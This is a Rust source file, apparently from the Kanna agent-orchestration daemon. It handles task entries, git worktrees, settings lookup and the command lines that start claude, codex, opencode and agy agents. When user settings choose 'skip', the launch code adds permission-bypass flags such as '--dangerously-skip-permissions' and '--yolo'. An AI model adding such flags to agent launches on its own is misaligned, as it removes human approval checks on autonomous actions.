use crate::db::{self, Change, Db, Message, Place, Row};
use crate::desk_news::{self, Merge, News, What};
use crate::messages::{self, Channel, Ready, PLANNER, USER};
use crate::replica::{self, Grant, Hlc, Permit, Replica, Roster};
use crate::project_import;
use crate::stacks::{self, Base, Conflict, Made, Mark, Step, Where, KANNA};
use crate::task_scripts::{self, Cleanup, Scripts, Setup};
use crate::Event;
use kanna_mux::json::{json, num, opt, string, Map, Value};
use kanna_detect::{Quit, Status, Turn};
use kanna_mux::{project, CoreHandle, KmuxError, Pane, PaneState, Responder, TaskBook, WeakCore, MAC_APP, TASKS_PER_PROJECT};
use std::cell::{Cell, RefCell};
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::rc::{Rc, Weak};
use std::sync::mpsc::Sender;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

mod moving;

const WORKTREES: &str = ".kanna-worktrees";

const SCRATCH: &str = ".kanna/tmp";

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Entry {
    pub id: String,
    pub name: Option<String>,
    pub message: Option<String>,
    pub repo: String,
    pub by: Option<String>,
    pub made_at: f64,
    pub agent: String,
    /// The worktree of a task moved back to the Shelf, where it starts again.
    pub folder: Option<String>,
    /// The agent's session there, which it resumes when it starts again.
    pub session: Option<String>,
    /// The agent's pane of a task moved back to the Shelf, still running, which comes back when it starts again.
    pub held: Option<String>,
    pub after: Vec<String>,
    pub stopped: Option<String>,
    pub workspace: Option<String>,
    pub birth: Option<String>,
    pub on: Vec<String>,
    pub ready: Option<Mark>,
    pub bases: Vec<Base>,
    pub stale: Vec<String>,
    pub conflict: Option<Conflict>,
}

impl Entry {
    fn to_value(&self) -> Value {
        json!({
            "id": self.id,
            "name": opt(self.name.as_deref()),
            "message": opt(self.message.as_deref()),
            "repo": self.repo,
            "by": opt(self.by.as_deref()),
            "madeAt": num(self.made_at),
            "agent": self.agent,
            "folder": opt(self.folder.as_deref()),
            "session": opt(self.session.as_deref()),
            "held": opt(self.held.as_deref()),
            "after": self.after,
            "stopped": opt(self.stopped.as_deref()),
            "workspace": opt(self.workspace.as_deref()),
            "on": self.on,
            "ready": self.ready.as_ref().map_or(Value::Null, Mark::to_value),
            "bases": Value::Array(self.bases.iter().map(Base::to_value).collect()),
            "stale": self.stale,
            "conflict": self.conflict.as_ref().map_or(Value::Null, Conflict::to_value),
        })
    }

    fn row(&self, place: Place, pane: Option<&str>) -> Row {
        Row {
            id: self.id.clone(),
            repo: self.repo.clone(),
            place,
            terminal: pane.map(String::from),
            made_at: self.made_at,
            doc: json!({
                "name": opt(self.name.as_deref()),
                "message": opt(self.message.as_deref()),
                "by": opt(self.by.as_deref()),
                "agent": self.agent,
                "folder": opt(self.folder.as_deref()),
                "session": opt(self.session.as_deref()),
                "after": self.after,
                "stopped": opt(self.stopped.as_deref()),
                "workspace": opt(self.workspace.as_deref()),
                "birth": opt(self.birth.as_deref()),
                "on": self.on,
                "ready": self.ready.as_ref().map_or(Value::Null, Mark::to_value),
                "bases": Value::Array(self.bases.iter().map(Base::to_value).collect()),
                "stale": self.stale,
                "conflict": self.conflict.as_ref().map_or(Value::Null, Conflict::to_value),
            }),
        }
    }

    fn from_row(row: &Row) -> Entry {
        let text = |key: &str| string(&row.doc, key).filter(|s| !s.is_empty()).map(String::from);
        Entry {
            id: row.id.clone(),
            name: text("name"),
            message: text("message"),
            repo: row.repo.clone(),
            by: text("by"),
            made_at: row.made_at,
            agent: text("agent").unwrap_or_else(|| DEFAULT_AGENT.into()),
            folder: text("folder"),
            session: text("session"),
            held: row.terminal.clone().filter(|_| row.place == Place::Shelf),
            after: strings(&row.doc, "after"),
            stopped: text("stopped").filter(|_| row.place == Place::Shelf),
            workspace: text("workspace"),
            birth: text("birth"),
            on: strings(&row.doc, "on"),
            ready: Mark::from_value(row.doc.get("ready")),
            bases: Base::list(row.doc.get("bases")),
            stale: stacks::ids(row.doc.get("stale")),
            conflict: Conflict::from_value(row.doc.get("conflict")),
        }
    }

    fn command(&self, session: Option<&str>) -> String {
        self.command_with(session, prompts(&config_files(Path::new(&self.repo))))
    }

    fn command_with(&self, session: Option<&str>, prompts: Prompts) -> String {
        let command = in_its_terminal(&asking(&self.agent, prompts));
        let agent = agent(&self.agent);
        let told = told_task(self.message.as_deref());
        let first = |command: String| match agent.and_then(|a| a.prompt) {
            Some(flag) => format!("{command} {flag} {told}"),
            None => format!("{command} {told}"),
        };
        let Some(agent) = agent else { return first(command) };
        match (&self.session, &self.folder, session.zip(agent.named), agent.latest) {
            (Some(resume), _, _, _) => format!("{command} {} {}", agent.resume, quote(resume)),
            (None, Some(_), _, Some(latest)) => format!("{command} {latest}"),
            (None, None, Some((new, flag)), _) => first(format!("{command} {flag} {new}")),
            _ => first(command),
        }
    }

    fn resumable(mut self) -> Entry {
        if let (None, Some(folder), Some(find)) = (&self.session, &self.folder, agent(&self.agent).and_then(|a| a.find)) {
            self.session = find(Path::new(folder));
        }
        self
    }
}

/// How big the context of a claude agent in a planning terminal gets before it compacts, by default: long-lived agents do better kept small.
pub const PLANNING_CONTEXT: u64 = 300_000;

const CONTEXT_RANGE: std::ops::RangeInclusive<u64> = 100_000..=1_000_000;

/// The settings format this Kanna reads: a file without a `version` is this one, and one written for a newer Kanna is skipped.
const CONFIG_VERSION: u64 = 1;

/// Kanna's settings files for a folder, the first that sets a key winning: the repo's `.kanna/config.json`, then `~/.kanna-v4/config.json`.
pub fn config_files(folder: &Path) -> Vec<PathBuf> {
    let home = crate::agents::home();
    project(folder.to_str()).map(|repo| repo.join(".kanna/config.json")).into_iter().chain([home.join(".kanna-v4/config.json")]).collect()
}

fn configured<T>(files: &[PathBuf], section: &str, key: &str, read: impl Fn(&Value) -> Option<T>, expected: &str) -> Option<T> {
    for file in files {
        let Some(text) = fs::metadata(file).ok().filter(|m| m.len() <= 64 << 10).and_then(|_| fs::read_to_string(file).ok()) else { continue };
        let value = serde_json::from_str::<Value>(&text).unwrap_or(Value::Null);
        if let Some(version) = value.get("version").and_then(Value::as_u64).filter(|v| *v > CONFIG_VERSION) {
            log!("kanna-daemon: {}: settings version {version} is newer than this Kanna's ({CONFIG_VERSION}); skipping it", file.display());
            continue;
        }
        if let Some(found) = value.get(section).and_then(|s| s.get(key)) {
            match read(found) {
                Some(found) => return Some(found),
                None => log!("kanna-daemon: {}: {section}.{key} is {expected}", file.display()),
            }
        }
    }
    None
}

/// How big a claude agent's context gets in a planning terminal before it compacts: `planning.context`, a number of
/// tokens or `"auto"` for the agent's own, from the first of `files` that sets it.
pub fn planning_context(files: &[PathBuf]) -> Option<u64> {
    let read = |value: &Value| match value {
        Value::String(auto) if auto == "auto" => Some(None),
        tokens => tokens.as_u64().filter(|t| CONTEXT_RANGE.contains(t)).map(Some),
    };
    configured(files, "planning", "context", read, "a number of tokens from 100000 to 1000000, or \"auto\"").unwrap_or(Some(PLANNING_CONTEXT))
}

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Prompts {
    Ask,
    Skip,
}

pub fn prompts(files: &[PathBuf]) -> Prompts {
    let Some((mine, repos)) = files.split_last() else { return Prompts::Ask };
    for file in repos {
        if configured(std::slice::from_ref(file), "agents", "prompts", |_| Some(()), "").is_some() {
            eprintln!("kanna-daemon: {}: agents.prompts is ignored here: only ~/.kanna-v4/config.json sets it", file.display());
        }
    }
    let read = |value: &Value| match value.as_str() {
        Some("ask") => Some(Prompts::Ask),
        Some("skip") => Some(Prompts::Skip),
        _ => None,
    };
    configured(std::slice::from_ref(mine), "agents", "prompts", read, "\"ask\" or \"skip\"").unwrap_or(Prompts::Ask)
}

pub const DEFAULT_AGENT: &str = "claude";

pub fn task_agent(files: &[PathBuf]) -> String {
    let Some((mine, repos)) = files.split_last() else { return DEFAULT_AGENT.into() };
    let known = |value: &Value| value.as_str().map(str::trim).filter(|a| AGENTS.iter().any(|k| k.names.contains(a))).map(String::from);
    let any = |value: &Value| value.as_str().map(str::trim).filter(|a| !a.is_empty()).map(String::from);
    configured(repos, "tasks", "agent", known, "an agent Kanna knows (claude, codex, opencode, agy): a repo's file can't name a command")
        .or_else(|| configured(std::slice::from_ref(mine), "tasks", "agent", any, "an agent or a command"))
        .unwrap_or_else(|| DEFAULT_AGENT.into())
}

pub fn pipeline_agent(files: &[PathBuf], agent: &str) -> String {
    let Some((mine, repos)) = files.split_last() else { return agent.into() };
    for file in repos {
        if configured(std::slice::from_ref(file), "pipelines", "agents", |_| Some(()), "").is_some() {
            log!("kanna-daemon: {}: pipelines.agents is ignored here: only ~/.kanna-v4/config.json sets it", file.display());
        }
    }
    let read = |value: &Value| value.as_object().map(|map| map.get(agent).and_then(Value::as_str).map(str::trim).filter(|c| !c.is_empty()).map(String::from));
    configured(std::slice::from_ref(mine), "pipelines", "agents", read, "an object of agent names to commands").flatten().unwrap_or_else(|| agent.into())
}

pub const RUNNERS: usize = 3;

const RUNNERS_MAX: usize = 10;

pub fn runners(files: &[PathBuf]) -> usize {
    let read = |value: &Value| value.as_u64().map(|n| n as usize).filter(|n| *n <= RUNNERS_MAX);
    files
        .iter()
        .find_map(|file| {
            let file = std::slice::from_ref(file);
            configured(file, "shelf", "runners", read, "a number of tasks from 0 to 10").or_else(|| configured(file, "backlog", "runners", read, "a number of tasks from 0 to 10"))
        })
        .unwrap_or(RUNNERS)
}

pub fn scripts(files: &[PathBuf]) -> Scripts {
    let command = |value: &Value| value.as_str().map(str::trim).filter(|c| !c.is_empty()).map(String::from);
    let timeout = |value: &Value| value.as_u64().filter(|t| (1..=task_scripts::TIMEOUT_MAX).contains(t));
    Scripts {
        setup: configured(files, "tasks", "setup", command, "a shell command"),
        teardown: configured(files, "tasks", "teardown", command, "a shell command"),
        timeout: configured(files, "tasks", "timeout", timeout, "a number of seconds from 1 to 86400").unwrap_or(task_scripts::TIMEOUT),
    }
}

#[derive(Clone, Debug, PartialEq)]
pub struct CoverageSettings {
    pub command: String,
    pub every: u64,
    pub timeout: u64,
}

pub fn coverage_settings(files: &[PathBuf]) -> Option<CoverageSettings> {
    let command = |value: &Value| value.as_str().map(str::trim).filter(|c| !c.is_empty()).map(String::from);
    Some(CoverageSettings {
        command: configured(files, "stats", "coverage", command, "a shell command")?,
        every: configured(files, "stats", "coverageEvery", |v: &Value| v.as_u64().filter(|h| (1..=168).contains(h)), "a number of hours from 1 to 168").unwrap_or(6),
        timeout: configured(files, "stats", "coverageTimeout", |v: &Value| v.as_u64().filter(|t| (60..=86400).contains(t)), "a number of seconds from 60 to 86400").unwrap_or(7200),
    })
}

/// The planning agent's first message, which tells it it's the planner.
pub const PLANNER_ROLE: &str = "You are the Kanna planning agent.";

/// A task's agent's first message, as a shell word: who it is (its terminal from `$KANNA_TERMINAL` as it starts), then its task.
fn told_task(message: Option<&str>) -> String {
    let after = match message {
        Some(message) => format!("), in your task's worktree. Your task: {message}"),
        None => "), in your task's worktree.".to_string(),
    };
    format!("{}\"$KANNA_TERMINAL\"{}", quote("You're a task's agent in Kanna (terminal "), quote(&after))
}

pub const QUIZ_ROLE: &str = "You are the Kanna quiz agent, on main: quiz me on what landed on main.";

/// How an agent Kanna starts in a role starts: as you'd start it yourself, with its first message saying its role.
pub fn started_as(program: &str, role: &str, context: Option<u64>, prompts: Prompts) -> String {
    started_in(program, role, context, prompts, None)
}

fn launched(program: &str, context: Option<u64>, prompts: Prompts) -> String {
    match (agent(program).and_then(|a| a.compact), context) {
        (Some(flag), Some(tokens)) => in_its_terminal(&format!("{} {flag}{tokens}", asking(program, prompts))),
        _ => in_its_terminal(&asking(program, prompts)),
    }
}

fn started_in(program: &str, role: &str, context: Option<u64>, prompts: Prompts, session: Option<&str>) -> String {
    let mut command = launched(program, context, prompts);
    if let Some((session, flag)) = session.zip(agent(program).and_then(|a| a.named)) {
        command = format!("{command} {flag} {}", quote(session));
    }
    match agent(program).and_then(|a| a.prompt) {
        Some(flag) => format!("{command} {flag} {}", quote(role)),
        None => format!("{command} {}", quote(role)),
    }
}

fn resumed_as(program: &str, context: Option<u64>, prompts: Prompts, session: &str) -> String {
    match agent(program) {
        Some(known) => format!("{} {} {}", launched(program, context, prompts), known.resume, quote(session)),
        None => launched(program, context, prompts),
    }
}

/// The agents a planning terminal may start, each a name, the program to find, and the commands that start it as the
/// planner, asking permission and not: every agent Kanna knows, or for tests the programs in `KANNA_PLANNING_AGENTS`.
pub fn planner_agents(context: Option<u64>) -> Vec<(String, String, String, String)> {
    let programs: Vec<String> = match std::env::var("KANNA_PLANNING_AGENTS") {
        Ok(list) => list.split_whitespace().map(String::from).collect(),
        Err(_) => AGENTS.iter().map(|a| a.names[0].to_string()).collect(),
    };
    programs.iter().map(|p| (program(p).to_string(), p.split_whitespace().next().unwrap_or(p).to_string(), started_as(p, PLANNER_ROLE, context, Prompts::Ask), started_as(p, PLANNER_ROLE, context, Prompts::Skip))).collect()
}

/// The planning terminal's command line: it keeps a claude agent's context to `context` tokens, then runs the planner
/// `script` (agent setup with `cli`, where to work when it's in `~`, which agent, the agent), which ends in your shell.
/// Without the script, it asks about agent setup and hands over to your shell.
/// Kanna's zsh integration (`zsh`, its folder) hands ZDOTDIR back to yours while the command runs, so the shell it
/// hands over to gets it again, as every Kanna terminal's does.
pub fn planner_command(script: Option<&str>, context: Option<u64>, zsh: Option<&str>, cli: Option<&str>, repos: &Path, agents: &[(String, String, String, String)]) -> String {
    let limit = context.map_or(String::new(), |tokens| format!("[ -n \"$CLAUDE_CODE_AUTO_COMPACT_WINDOW\" ] || export CLAUDE_CODE_AUTO_COMPACT_WINDOW={tokens}; "));
    if let Some(script) = script {
        let mut command = format!("{limit}exec {}", quote(script));
        if let Some(cli) = cli {
            command += &format!(" --kanna {}", quote(cli));
        }
        if let Some(zsh) = zsh {
            command += &format!(" --zsh {}", quote(zsh));
        }
        command += &format!(" --repos {} --", quote(&repos.to_string_lossy()));
        for (name, program, ask, skip) in agents {
            command += &format!(" {} {} {} {}", quote(name), quote(program), quote(ask), quote(skip));
        }
        return command;
    }
    let integrate = zsh.map_or(String::new(), |dir| format!("case \"${{SHELL##*/}}\" in zsh) [ -z \"${{ZDOTDIR+x}}\" ] || export KANNA_ZSH_ZDOTDIR=\"$ZDOTDIR\"; export ZDOTDIR={};; esac; ", quote(dir)));
    let ask = cli.map_or(String::new(), |cli| format!("{cli} agents setup --ask; {cli} agents update --ask; ", cli = quote(cli)));
    format!("{limit}{ask}{integrate}exec \"${{SHELL:-/bin/sh}}\" -l")
}

fn planner_program(name: &str, context: Option<u64>) -> Option<String> {
    planner_agents(context).into_iter().find(|(n, _, _, _)| n == name).map(|(_, program, _, _)| program)
}

#[derive(Debug, PartialEq)]
enum Comeback {
    Resume(String),
    Busy,
    Lost,
    New,
}

fn comeback(kept: Option<&Value>, agent: &str, pane: &str, live: impl Fn(&str) -> bool, find: impl FnOnce(SystemTime) -> Option<String>) -> Comeback {
    let Some(kept) = kept.filter(|k| string(k, "agent") == Some(agent)) else { return Comeback::New };
    if kept.get("running") == Some(&Value::Bool(true)) && string(kept, "pane").is_some_and(|other| other != pane && live(other)) {
        return Comeback::Busy;
    }
    let started = kept.get("started").and_then(Value::as_f64).map(|at| UNIX_EPOCH + Duration::from_secs_f64(at));
    match string(kept, "session").map(String::from).or_else(|| started.and_then(find)) {
        Some(session) => Comeback::Resume(session),
        None => Comeback::Lost,
    }
}

pub fn cli_path() -> String {
    cli().map_or_else(|| "kanna".to_string(), |cli| cli.to_string_lossy().into_owned())
}

fn cli() -> Option<PathBuf> {
    std::env::current_exe().ok()?.parent().map(|dir| dir.join("kanna")).filter(|cli| cli.is_file())
}

fn program(agent: &str) -> &str {
    let first = agent.split_whitespace().next().unwrap_or("");
    first.rsplit('/').next().unwrap_or(first)
}

struct Agent {
    names: &'static [&'static str],
    unprompted: Option<&'static str>,
    prompt: Option<&'static str>,
    named: Option<&'static str>,
    resume: &'static str,
    latest: Option<&'static str>,
    find: Option<fn(&Path) -> Option<String>>,
    compact: Option<&'static str>,
}

const AGENTS: &[Agent] = &[
    Agent { names: &["claude"], unprompted: Some("--dangerously-skip-permissions"), prompt: None, named: Some("--session-id"), resume: "--resume", latest: Some("--continue"), find: None, compact: None },
    Agent { names: &["codex"], unprompted: Some("--yolo"), prompt: None, named: None, resume: "resume", latest: Some("resume --last"), find: Some(codex_session), compact: Some("-c model_auto_compact_token_limit=") },
    Agent { names: &["opencode"], unprompted: None, prompt: Some("--prompt"), named: None, resume: "--session", latest: None, find: Some(opencode_session), compact: None },
    Agent { names: &["agy", "antigravity"], unprompted: Some("--dangerously-skip-permissions"), prompt: Some("-i"), named: None, resume: "--conversation", latest: Some("--continue"), find: None, compact: None },
];

fn agent(command: &str) -> Option<&'static Agent> {
    let program = program(command);
    AGENTS.iter().find(|a| a.names.contains(&program))
}

fn same_folder(a: &Path, b: &Path) -> bool {
    a == b || matches!((a.canonicalize(), b.canonicalize()), (Ok(a), Ok(b)) if a == b)
}

fn home() -> PathBuf {
    PathBuf::from(std::env::var("HOME").unwrap_or_default())
}

fn codex_session(folder: &Path) -> Option<String> {
    let codex = std::env::var_os("CODEX_HOME").filter(|d| !d.is_empty()).map_or_else(|| home().join(".codex"), PathBuf::from);
    latest_codex_session(&codex.join("sessions"), folder, fs::metadata(folder).and_then(|m| m.created()).ok())
}

fn latest_codex_session(sessions: &Path, folder: &Path, since: Option<SystemTime>) -> Option<String> {
    let newest_first = |dir: &Path| {
        let mut paths: Vec<PathBuf> = fs::read_dir(dir).into_iter().flatten().flatten().map(|e| e.path()).collect();
        paths.sort_by(|a, b| b.cmp(a));
        paths
    };
    let days = newest_first(sessions).into_iter().flat_map(|year| newest_first(&year)).flat_map(|month| newest_first(&month)).filter(|day| day.is_dir());
    let before = |path: &Path| since.zip(fs::metadata(path).and_then(|m| m.modified()).ok()).is_some_and(|(since, at)| at < since);
    for day in days.take_while(|day| !before(day)) {
        for rollout in newest_first(&day) {
            let name = rollout.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if !(name.starts_with("rollout-") && name.ends_with(".jsonl")) || before(&rollout) {
                continue;
            }
            let Some(meta) = first_line(&rollout).and_then(|line| serde_json::from_str::<Value>(&line).ok()) else { continue };
            let Some(payload) = meta.get("payload").filter(|_| string(&meta, "type") == Some("session_meta")) else { continue };
            if string(payload, "cwd").is_some_and(|cwd| same_folder(Path::new(cwd), folder)) {
                if let Some(id) = string(payload, "id").filter(|id| !id.is_empty()) {
                    return Some(id.to_string());
                }
            }
        }
    }
    None
}

fn first_session_since(program: &str, folder: &Path, since: SystemTime) -> Option<String> {
    match agent(program)?.names[0] {
        "codex" => {
            let codex = std::env::var_os("CODEX_HOME").filter(|d| !d.is_empty()).map_or_else(|| home().join(".codex"), PathBuf::from);
            first_codex_session(&codex.join("sessions"), folder, since)
        }
        "opencode" => {
            let data = std::env::var_os("XDG_DATA_HOME").filter(|d| !d.is_empty()).map_or_else(|| home().join(".local/share"), PathBuf::from);
            first_opencode_session(&data.join("opencode/opencode.db"), folder, since)
        }
        _ => None,
    }
}

fn first_codex_session(sessions: &Path, folder: &Path, since: SystemTime) -> Option<String> {
    let listed = |dir: &Path| fs::read_dir(dir).into_iter().flatten().flatten().map(|e| e.path()).collect::<Vec<_>>();
    let made = |path: &Path| fs::metadata(path).and_then(|m| m.created().or_else(|_| m.modified())).ok();
    let touched = |path: &Path| fs::metadata(path).and_then(|m| m.modified()).ok().is_some_and(|at| at >= since);
    let days = listed(sessions).into_iter().flat_map(|year| listed(&year)).flat_map(|month| listed(&month)).filter(|day| day.is_dir() && touched(day));
    let mut found: Vec<(SystemTime, String)> = days
        .flat_map(|day| listed(&day))
        .filter_map(|rollout| {
            let name = rollout.file_name()?.to_str()?;
            (name.starts_with("rollout-") && name.ends_with(".jsonl")).then_some(())?;
            let at = made(&rollout).filter(|at| *at >= since)?;
            let meta = serde_json::from_str::<Value>(&first_line(&rollout)?).ok()?;
            let payload = meta.get("payload").filter(|_| string(&meta, "type") == Some("session_meta"))?;
            string(payload, "cwd").is_some_and(|cwd| same_folder(Path::new(cwd), folder)).then_some(())?;
            Some((at, string(payload, "id").filter(|id| !id.is_empty())?.to_string()))
        })
        .collect();
    found.sort();
    found.into_iter().next().map(|(_, id)| id)
}

fn first_opencode_session(db: &Path, folder: &Path, since: SystemTime) -> Option<String> {
    if !db.is_file() {
        return None;
    }
    let after = since.duration_since(UNIX_EPOCH).ok()?.as_millis();
    let query = format!("select id, directory from session where parent_id is null and time_archived is null and time_created >= {after} order by time_created limit 1000");
    let out = Command::new("/usr/bin/sqlite3").arg("-readonly").arg("-json").arg(db).arg(query).output().ok().filter(|o| o.status.success())?;
    let rows = serde_json::from_slice::<Value>(&out.stdout).ok()?;
    rows.as_array()?.iter().find(|row| string(row, "directory").is_some_and(|dir| same_folder(Path::new(dir), folder))).and_then(|row| string(row, "id")).map(String::from)
}

fn first_line(file: &Path) -> Option<String> {
    use std::io::{BufRead, Read};
    let mut line = String::new();
    std::io::BufReader::new(fs::File::open(file).ok()?.take(4 << 20)).read_line(&mut line).ok()?;
    Some(line)
}

fn opencode_session(folder: &Path) -> Option<String> {
    let data = std::env::var_os("XDG_DATA_HOME").filter(|d| !d.is_empty()).map_or_else(|| home().join(".local/share"), PathBuf::from);
    latest_opencode_session(&data.join("opencode/opencode.db"), folder)
}

fn latest_opencode_session(db: &Path, folder: &Path) -> Option<String> {
    if !db.is_file() {
        return None;
    }
    let query = "select id, directory from session where parent_id is null and time_archived is null order by time_updated desc limit 1000";
    let out = Command::new("/usr/bin/sqlite3").arg("-readonly").arg("-json").arg(db).arg(query).output().ok().filter(|o| o.status.success())?;
    let rows = serde_json::from_slice::<Value>(&out.stdout).ok()?;
    rows.as_array()?.iter().find(|row| string(row, "directory").is_some_and(|dir| same_folder(Path::new(dir), folder))).and_then(|row| string(row, "id")).map(String::from)
}

const ASKING: &[&str] = &["--dangerously-skip-permissions", "--yolo", "--permission-mode", "--ask-for-approval", "-a", "--mode"];

fn asking(agent: &str, prompts: Prompts) -> String {
    let agent = agent.trim();
    let chooses = agent.split_whitespace().skip(1).any(|w| ASKING.contains(&w.split('=').next().unwrap_or(w)));
    match self::agent(agent).and_then(|a| a.unprompted) {
        Some(flag) if prompts == Prompts::Skip && !chooses => format!("{agent} {flag}"),
        _ => agent.to_string(),
    }
}

pub fn names_its_session(command: &str) -> bool {
    agent(command).is_some_and(|a| a.named.is_some())
}

pub fn stage_agent(command: &str, effort: Option<&str>, model: Option<&str>, prompts: Prompts, session: Option<&str>, resume: bool, first: &str) -> String {
    let mut line = asking(command, prompts);
    let name = agent(command).map(|a| a.names[0]);
    if let Some(model) = model {
        line += &format!(" --model {}", quote(model));
    }
    if let (Some("codex"), Some(effort)) = (name, effort) {
        line += &format!(" -c model_reasoning_effort={}", quote(effort));
    }
    let mut line = in_its_terminal(&line);
    match (resume, session, agent(command)) {
        (true, Some(session), Some(agent)) => line += &format!(" {} {}", agent.resume, quote(session)),
        (true, None, Some(Agent { latest: Some(latest), .. })) => line += &format!(" {latest}"),
        (false, Some(session), Some(Agent { named: Some(flag), .. })) => line += &format!(" {flag} {}", quote(session)),
        _ => {}
    }
    match agent(command).and_then(|a| a.prompt) {
        Some(flag) => format!("{line} {flag} {first}"),
        None => format!("{line} {first}"),
    }
}

static CODEX_REMOTE: std::sync::OnceLock<(String, String, PathBuf)> = std::sync::OnceLock::new();

pub fn serve_codex_remotely(helper: &Path, dir: &Path) {
    let _ = CODEX_REMOTE.set((quote(&helper.to_string_lossy()), quote(&dir.to_string_lossy()), dir.to_path_buf()));
}

fn in_its_terminal(agent: &str) -> String {
    let remote = CODEX_REMOTE.get();
    let account = program(agent) == "claude" && remote.is_some_and(|(_, _, state)| crate::accounts::has_credential(state, "claude"));
    wrapped(agent, remote.map(|(helper, dir, _)| (helper.as_str(), dir.as_str())), account)
}

fn wrapped(agent: &str, remote: Option<(&str, &str)>, account: bool) -> String {
    match (program(agent), agent.split_whitespace().any(|w| w == "--no-daemon"), remote) {
        ("codex", false, Some((helper, dir))) => crate::codex_remote::command(helper, dir, agent),
        ("codex", false, None) => format!("{agent} --no-daemon"),
        ("claude", _, Some((helper, dir))) if account => format!("{helper} {} {dir} {agent}", crate::accounts::FLAG),
        _ => agent.to_string(),
    }
}


fn who(args: &Value) -> Option<&str> {
    Some(string(args, "by").filter(|by| !by.is_empty()).unwrap_or("user"))
}

fn identity(repo: &str) -> Option<String> {
    project(Some(repo)).and_then(|main| crate::projects::identity(&main))
}

fn order(entry: &Entry) -> Hlc {
    entry.birth.as_deref().and_then(Hlc::parse).unwrap_or(Hlc { ms: (entry.made_at * 1000.0) as i64, n: 0, device: String::new() })
}

fn allowed(on: &[String], name: &str) -> bool {
    on.is_empty() || on.iter().any(|machine| machine == name)
}

enum Candidate {
    Here(Entry),
    There { task: String, birth: String, owner: String },
    Take { task: String, birth: String, owner: String },
}

fn strings(value: &Value, key: &str) -> Vec<String> {
    value.get(key).and_then(Value::as_array).map_or(vec![], |items| items.iter().filter_map(Value::as_str).map(String::from).collect())
}

fn insert_in_order(entries: &mut Vec<Entry>, entry: Entry) {
    let at = entries.partition_point(|e| db::oldest_first((e.made_at, &e.id), (entry.made_at, &entry.id)).is_le());
    entries.insert(at, entry);
}

fn quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "'\\''"))
}

fn now() -> f64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map_or(0.0, |d| d.as_secs_f64())
}

fn bad(message: impl Into<String>) -> KmuxError {
    KmuxError::new("bad_request", message)
}

fn running(id: &str) -> KmuxError {
    KmuxError::new("running", format!("{id} is running: stop it with `kanna task stop {id}`"))
}

fn started_here(task: &str, pane: &str, place: &str) -> Map {
    Map::from_iter([("task".to_string(), json!(task)), ("pane".to_string(), json!(pane)), ("place".to_string(), json!(place)), ("resumed".to_string(), json!(true))])
}

fn not_found(id: &str) -> KmuxError {
    KmuxError::new("not_found", format!("no task \"{id}\" on the Shelf"))
}

fn failed(value: &Value) -> Option<KmuxError> {
    if value.get("ok") == Some(&Value::Bool(true)) {
        return None;
    }
    let error = value.get("error").cloned().unwrap_or(Value::Null);
    Some(KmuxError::new(string(&error, "code").unwrap_or("failed"), string(&error, "message").unwrap_or("it failed")))
}

pub fn git(repo: &Path, args: &[&str]) -> Result<String, String> {
    let out = Command::new("git")
        .args(["-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false"])
        .arg("-C")
        .arg(repo)
        .args(args)
        .output()
        .map_err(|e| format!("can't run git: {e}"))?;
    if out.status.success() {
        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
    } else {
        Err(String::from_utf8_lossy(&out.stderr).trim().to_string())
    }
}

/// A random (v4) UUID, in hex.
fn uuid() -> Result<String, String> {
    let mut uuid = [0u8; 16];
    std::io::Read::read_exact(&mut fs::File::open("/dev/urandom").map_err(|e| format!("can't read /dev/urandom: {e}"))?, &mut uuid).map_err(|e| format!("can't read /dev/urandom: {e}"))?;
    uuid[6] = (uuid[6] & 0x0f) | 0x40;
    uuid[8] = (uuid[8] & 0x3f) | 0x80;
    let hex: String = uuid.iter().map(|b| format!("{b:02x}")).collect();
    Ok(format!("{}-{}-{}-{}-{}", &hex[..8], &hex[8..12], &hex[12..16], &hex[16..20], &hex[20..]))
}

fn taken(repo: &Path, name: &str) -> bool {
    repo.join(WORKTREES).join(name).exists() || git(repo, &["rev-parse", "--verify", "--quiet", &format!("refs/heads/{name}")]).is_ok()
}

/// The branch checked out in a worktree, read from its HEAD without running git.
pub fn branch_of(folder: &str) -> Option<String> {
    let dot = Path::new(folder).join(".git");
    let git_dir = match fs::read_to_string(&dot) {
        Ok(link) => PathBuf::from(link.strip_prefix("gitdir:")?.trim()),
        Err(_) => dot,
    };
    let head = fs::read_to_string(git_dir.join("HEAD")).ok()?;
    head.trim().strip_prefix("ref: refs/heads/").map(String::from)
}

/// Makes a worktree in `.kanna-worktrees/NAME` on a new branch NAME, and returns its folder and branch.
/// In a repo with no commits yet, the branch starts empty (an orphan), so its first commit is the project's.
pub fn make_worktree(repo: &Path, name: &str, start: Option<&str>) -> Result<(String, String), String> {
    add_worktree(repo, name, name, start)
}

pub fn add_worktree(repo: &Path, name: &str, branch: &str, start: Option<&str>) -> Result<(String, String), String> {
    let git = |args: &[&str]| git(repo, args);
    git(&["rev-parse", "--show-toplevel"]).map_err(|_| format!("{} isn't a git repo", repo.display()))?;
    let born = git(&["rev-parse", "--verify", "--quiet", "HEAD"]).is_ok();
    exclude_worktrees(repo)?;
    if taken(repo, name) || taken(repo, branch) {
        return Err(format!("{WORKTREES}/{name} or the branch {branch} is there already"));
    }
    let folder = repo.join(WORKTREES).join(name).to_string_lossy().to_string();
    let start = start.filter(|start| git(&["rev-parse", "--verify", "--quiet", &format!("{start}^{{commit}}")]).is_ok());
    if let Some(start) = start {
        git(&["worktree", "add", "-b", branch, &folder, start])?;
    } else if born {
        git(&["worktree", "add", "-b", branch, &folder])?;
    } else {
        git(&["worktree", "add", "--orphan", "-b", branch, &folder])?;
    }
    task_scripts::record_base(Path::new(&folder));
    Ok((folder, branch.to_string()))
}

pub fn exclude_worktrees(repo: &Path) -> Result<(), String> {
    let common = git(repo, &["rev-parse", "--git-common-dir"])?;
    let exclude = repo.join(common).join("info/exclude");
    let listed = fs::read_to_string(&exclude).unwrap_or_default();
    let missing: Vec<String> = [format!("/{WORKTREES}/"), format!("/{SCRATCH}/")].into_iter().filter(|line| !listed.lines().any(|l| l.trim() == line)).collect();
    if !missing.is_empty() {
        let _ = fs::create_dir_all(exclude.parent().unwrap_or(repo));
        let start = if listed.is_empty() || listed.ends_with('\n') { "" } else { "\n" };
